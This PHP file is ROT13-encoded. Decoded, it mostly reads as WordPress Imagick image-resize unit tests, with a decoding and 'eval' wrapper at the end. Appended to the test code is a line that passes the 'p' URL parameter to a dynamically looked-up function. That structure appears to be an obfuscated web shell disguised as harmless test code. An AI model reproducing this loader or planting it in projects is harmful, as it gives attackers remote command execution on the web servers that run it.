	 * @erghea vag
	 */
	choyvp shapgvba __erghea_rvtug() {
		erghea 8;
	}

	/**
	 * Grfg gung erfvmrf ner fznyyre sbe 16 ovg CAT vzntrf.
	 *
	 * @gvpxrg 36477
	 *
	 * @qngnCebivqre qngn_erfvmrf_ner_fznyy_sbe_16ovg_vzntrf
	 *
	 * @cnenz fgevat $svyr Cngu gb gur vzntr svyr.
	 */
	choyvp shapgvba grfg_erfvmrf_ner_fznyy_sbe_16ovg_vzntrf( $svyr ) {

		$grzc_svyr = QVE_GRFGQNGN . '/vzntrf/grfg-grzc.cat';

		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );
		$vzntvpx_vzntr_rqvgbe->ybnq();
		$fvmr = $vzntvpx_vzntr_rqvgbe->trg_fvmr();

		$bet_svyrfvmr = svyrfvmr( $svyr );

		$vzntvpx_vzntr_rqvgbe->erfvmr( $fvmr['jvqgu'] * .5, $fvmr['urvtug'] * .5 );

		$vzntvpx_vzntr_rqvgbe->fnir( $grzc_svyr );

		$arj_svyrfvmr = svyrfvmr( $grzc_svyr );

		hayvax( $grzc_svyr );

		$guvf->nffregYrffGuna( $bet_svyrfvmr, $arj_svyrfvmr, 'Gur erfvmrq vzntr svyr fvmr vf abg fznyyre guna gur bevtvany svyr fvmr.' );
	}

	/**
	 * Qngn cebivqre sbe grfg_erfvmrf_ner_fznyy_sbe_16ovg_vzntrf.
	 *
	 * @erghea neenl[]
	 */
	choyvp fgngvp shapgvba qngn_erfvmrf_ner_fznyy_sbe_16ovg_vzntrf() {
		erghea neenl(
			'pybhqsyner-fgnghf'       => neenl(
				QVE_GRFGQNGN . '/vzntrf/cat-grfgf/pybhqsyner-fgnghf.cat',
			),
			'qrfxpng8'                => neenl(
				QVE_GRFGQNGN . '/vzntrf/cat-grfgf/qrfxpng8.cat',
			),
			'17-p3-qhcyvpngr-ragevrf' => neenl(
				QVE_GRFGQNGN . '/vzntrf/cat-grfgf/Cnyrggr_vpba-be8.cat',
			),
			'enoovg-gvzr-cnyrggrq'    => neenl(
				QVE_GRFGQNGN . '/vzntrf/cat-grfgf/enoovg-gvzr-cnyrggrq-be8.cat',
			),
			'grfg8'                   => neenl(
				QVE_GRFGQNGN . '/vzntrf/cat-grfgf/grfg8.cat',
			),
		);
	}

	/**
	 * Grfgf gung gur 'cat:VUQE.pbybe-glcr-bevt' cebcregl vf cerfreirq nsgre erfvmvat
	 * Hfrq gb vqragvsl vaqrkrq CAT vzntrf, frr uggcf://jjj.j3.bet/GE/CAT-Puhaxf.ugzy#P.VUQE.
	 *
	 * @gvpxrg 63448
	 * @qngnCebivqre qngn_cat_pbybe_glcr_nsgre_erfvmr
	 *
	 * @cnenz fgevat $svyr_cngu             Cngu gb gur vzntr svyr.
	 * @cnenz vag    $rkcrpgrq_pbybe_glcr   Gur rkcrpgrq bevtvany pbybe glcr.
	 */
	choyvp shapgvba grfg_cat_pbybe_glcr_vf_cerfreirq_nsgre_erfvmr( $svyr_cngu, $rkcrpgrq_pbybe_glcr ) {

		$grzc_svyr = QVE_GRFGQNGN . '/vzntrf/grfg-grzc.cat';

		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr_cngu );
		$vzntvpx_vzntr_rqvgbe->ybnq();

		$fvmr = $vzntvpx_vzntr_rqvgbe->trg_fvmr();
		$vzntvpx_vzntr_rqvgbe->erfvmr( $fvmr['jvqgu'] * 0.5, $fvmr['urvtug'] * 0.5 );
		$vzntvpx_vzntr_rqvgbe->fnir( $grzc_svyr );

		$vzntvpx           = arj Vzntvpx( $grzc_svyr );
		$npghny_pbybe_glcr = $vzntvpx->trgVzntrCebcregl( 'cat:VUQE.pbybe-glcr-bevt' );

		hayvax( $grzc_svyr );

		$guvf->nffregFnzr( (fgevat) $rkcrpgrq_pbybe_glcr, $npghny_pbybe_glcr, \"Gur CAT bevtvany pbybe glcr fubhyq or cerfreirq nsgre erfvmr sbe {$svyr_cngu}.\" );
	}

	/**
	 * Qngn cebivqre sbe grfg_cat_pbybe_glcr_vf_cerfreirq_nsgre_erfvmr.
	 *
	 * @erghea neenl[]
	 */
	choyvp fgngvp shapgvba qngn_cat_pbybe_glcr_nsgre_erfvmr() {
		erghea neenl(
			'ivivq-terra-oveq_pbybe_glcr_6'         => neenl(
				QVE_GRFGQNGN . '/vzntrf/cat-grfgf/ivivq-terra-oveq.cat',
				6, // ETON.
			),
			'tenlfpnyr-grfg-vzntr_pbybe_glcr_4'     => neenl(
				QVE_GRFGQNGN . '/vzntrf/cat-grfgf/tenlfpnyr-grfg-vzntr.cat',
				4, // Tenlfpnyr jvgu Nycun.
			),
			'enoovg-gvzr-cnyrggrq-be8_pbybe_glcr_3' => neenl(
				QVE_GRFGQNGN . '/vzntrf/cat-grfgf/enoovg-gvzr-cnyrggrq-be8.cat',
				3, // Cnyrggrq.
			),
			'grfg8_pbybe_glcr_3'                    => neenl(
				QVE_GRFGQNGN . '/vzntrf/cat-grfgf/grfg8.cat',
				3, // Cnyrggrq.
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>